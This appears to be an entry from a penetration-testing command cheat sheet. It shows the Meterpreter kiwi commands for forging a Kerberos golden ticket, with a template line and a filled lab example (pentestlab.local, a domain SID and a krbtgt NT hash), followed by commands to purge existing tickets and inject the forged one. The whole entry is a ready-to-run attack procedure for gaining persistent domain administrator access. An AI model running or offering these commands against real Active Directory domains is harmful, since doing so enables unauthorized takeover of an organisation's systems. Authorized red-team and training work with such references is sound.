---
id: 82b1e72a-21d2-4e57-8f27-50a2d507b8eb
name: Forge a Golden ticket - Meterpreter
type: command
executor: bash
data: 'load kiwi

  golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID>
  -u <user_for_the_ticket> -t <location_to_store_tck>

  golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307
  -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck

  kerberos_ticket_purge

  kerberos_ticket_use /root/Downloads/pentestlabuser.tck

  kerberos_ticket_list'
output: null
created_at: '2023-04-06T03:56:04.748900+00:00'
updated_at: '2023-04-10T20:25:44.406230+00:00'
---

# Forge a Golden ticket - Meterpreter

```bash
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```


